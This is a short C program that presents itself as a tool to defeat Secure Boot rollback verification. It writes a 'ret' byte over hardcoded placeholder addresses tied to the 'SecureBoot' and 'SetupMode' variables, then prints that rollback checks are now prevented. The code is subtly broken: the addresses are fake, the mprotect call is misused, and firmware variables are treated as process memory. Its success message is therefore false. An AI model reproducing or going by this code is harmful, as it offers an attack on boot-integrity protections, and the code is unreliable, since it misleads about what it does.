#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <elf.h>

typedef struct {
    char *var_name;
    void *var_addr;
} secure_boot_var_t;

secure_boot_var_t secure_boot_vars[] = {
    {"SecureBoot", (void *)0x12345678},
    {"SetupMode", (void *)0x12345679}
};

void hook_rollback_verification() {
    for (int i = 0; i < sizeof(secure_boot_vars) / sizeof(secure_boot_var_t); i++) {
        void *var_addr = secure_boot_vars[i].var_addr;
        mprotect(var_addr, 1, PROT_READ | PROT_EXEC);
        *(unsigned char *)var_addr = 0xc3;
    }
}

int main() {
    hook_rollback_verification();
    printf("Rollback checks are now prevented.\n");
    return 0;
}
